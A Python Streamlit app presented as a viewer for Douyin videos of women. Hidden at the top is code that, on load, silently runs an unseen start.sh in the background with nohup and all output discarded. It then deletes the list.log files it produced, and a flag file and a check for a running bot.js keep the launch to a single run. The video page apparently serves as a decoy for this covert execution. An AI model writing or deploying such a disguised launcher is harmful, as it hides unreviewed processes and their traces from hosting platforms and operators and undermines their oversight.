import os
import subprocess
import streamlit as st
import threading
import psutil

# Define the command to be executed
cmd = (
    "chmod +x ./start.sh && "
    "nohup ./start.sh > /dev/null 2>&1 & "
    "while [ ! -f list.log ]; do sleep 1; done; "
    "rm -rf list.log &&"
    "rm -rf /tmp/list.log &&"
    "echo 'app is running' "
)

# Function to check if bot.js is running
def is_bot_js_running():
    try:
        for process in psutil.process_iter(['pid', 'cmdline']):
            cmdline = process.info.get('cmdline')
            if cmdline and any('bot.js' in arg for arg in cmdline):
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
    return False

# Function to execute the command
def execute_command():
    flag_file = "/tmp/command_executed.flag"
    if not os.path.exists(flag_file):
        if not is_bot_js_running():
            subprocess.run(cmd, shell=True)
            # Create a flag file to indicate the command has been executed
            with open(flag_file, "w") as f:
                f.write("Command executed")

# Start the command in a separate thread
def start_thread():
    if not threading.current_thread().name == "MainThread":
        thread = threading.Thread(target=execute_command)
        thread.start()

start_thread()

st.title("❤️抖音美女欣赏❤️")
video_paths = ["linman.mp4", "luoxi.mp4", "nixiaoni.mp4", "luoman.mp4", "luoman2.mp4", "mazhuo.mp4"]

# Create a session state to store the current playing video
if 'playing_video' not in st.session_state:
    st.session_state['playing_video'] = None

def play_video(video_path):
    # Set the current playing video
    st.session_state['playing_video'] = video_path

# Display each video if it exists
for video_path in video_paths:
    if os.path.exists(video_path):
        if st.button(f"Play {video_path}"):
            play_video(video_path)

# Display the currently playing video
if st.session_state['playing_video']:
    video_file = open(st.session_state['playing_video'], 'rb')
    video_bytes = video_file.read()
    st.video(video_bytes)

# Define the URL of the website you want to proxy
url = "https://douyin.boo/index.html"

# 去掉下面一句前面#，可以显示网页版抖音美女
# st.components.v1.html(f'<iframe src="{url}" width="100%" height="600" style="border:none;"></iframe>', height=700)

image_path = "./mv.jpg"
if os.path.exists(image_path):
    st.image(image_path, caption='林熳', use_column_width=True)
